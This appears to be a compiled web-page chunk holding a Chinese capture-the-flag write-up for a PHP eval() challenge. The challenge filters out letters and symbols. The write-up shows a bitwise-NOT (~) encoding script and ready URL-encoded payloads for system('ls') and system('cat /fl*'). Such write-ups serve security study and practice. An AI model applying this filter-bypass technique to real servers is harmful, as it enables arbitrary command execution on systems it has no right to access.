import{_ as e,r as o,o as c,c as l,a as n,b as s,d as t,e as p}from"./app-3b511de6.js";const i={},u=p(`<p>#RCE</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>   
	<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
	<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
	<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;wllm&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>    
		<span class="token variable">$wllm</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;wllm&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    
		<span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">&#39; &#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;\\t&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;\\r&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;\\n&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;\\+&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;\\[&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;\\^&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;\\]&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;\\&quot;&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;\\-&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;\\$&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;\\*&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;\\?&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;\\&lt;&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;\\&gt;&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;\\=&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;\\\`&#39;</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       
		<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span>       <span class="token punctuation">{</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;/&#39;</span> <span class="token operator">.</span> <span class="token variable">$blackitem</span> <span class="token operator">.</span> <span class="token string single-quoted-string">&#39;/m&#39;</span><span class="token punctuation">,</span> <span class="token variable">$wllm</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>           
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>   
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;/[a-zA-Z]/is&#39;</span><span class="token punctuation">,</span><span class="token variable">$wllm</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token punctuation">{</span>       
		<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;Ra&#39;s Al Ghul说不能用字母哦！&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
	<span class="token punctuation">}</span>   
	<span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span><span class="token punctuation">;</span>   
	<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$wllm</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span>   
	<span class="token keyword">else</span>   <span class="token punctuation">{</span>       
	<span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;蔡总说：注意审题！！！&quot;</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span>   
<span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,2),r={href:"https://blog.csdn.net/miuzzx/article/details/109143413",target:"_blank",rel:"noopener noreferrer"},k=p(`<p>无字母 RCE 本题可以取反 取反PHP脚本</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token constant">STDOUT</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;[+]your function: &#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$system</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;\\r\\n&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;\\r&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;\\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token constant">STDIN</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token constant">STDOUT</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;[+]your command: &#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$command</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;\\r\\n&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;\\r&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;\\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token constant">STDIN</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">&#39;[*] (~&#39;</span> <span class="token operator">.</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$system</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">&#39;)(~&#39;</span> <span class="token operator">.</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$command</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">&#39;);&#39;</span><span class="token punctuation">;</span>
</span></code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,2),d={href:"https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html",target:"_blank",rel:"noopener noreferrer"},g=p(`<h4 id="取反" tabindex="-1"><a class="header-anchor" href="#取反" aria-hidden="true">#</a> 取反(~)</h4><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;system&#39;</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;cat /fl*&#39;</span><span class="token punctuation">;</span>
<span class="token variable">$ak</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$bk</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">&#39;(&#39;</span> <span class="token operator">.</span> <span class="token string single-quoted-string">&#39;~&#39;</span> <span class="token operator">.</span> <span class="token variable">$ak</span> <span class="token operator">.</span> <span class="token string single-quoted-string">&#39;)&#39;</span> <span class="token operator">.</span> <span class="token string single-quoted-string">&#39;(&#39;</span> <span class="token operator">.</span> <span class="token string single-quoted-string">&#39;~&#39;</span> <span class="token operator">.</span> <span class="token variable">$bk</span> <span class="token operator">.</span> <span class="token string single-quoted-string">&#39;)&#39;</span><span class="token punctuation">;</span>
</span></code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;ls&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// (~%8C%86%8C%8B%9A%92)(~%93%8C);</span>
<span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;cat /fl*&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// (~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%D5);</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,3),v={href:"https://blog.csdn.net/miuzzx/article/details/109143413",target:"_blank",rel:"noopener noreferrer"};function m(b,q){const a=o("ExternalLinkIcon");return c(),l("div",null,[u,n("p",null,[n("a",r,[s("无字母数字绕过正则表达式总结含上传临时文件、异或、或、取反、自增脚本"),t(a)])]),k,n("p",null,[s("参考 "),n("a",d,[s("一些不包含数字和字母的webshell | 离别歌 (leavesongs.com)"),t(a)])]),g,n("p",null,[n("a",v,[s("无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）_数字绕过+_yu22x的博客-CSDN博客"),t(a)])])])}const f=e(i,[["render",m],["__file","hardrce.html.vue"]]);export{f as default};
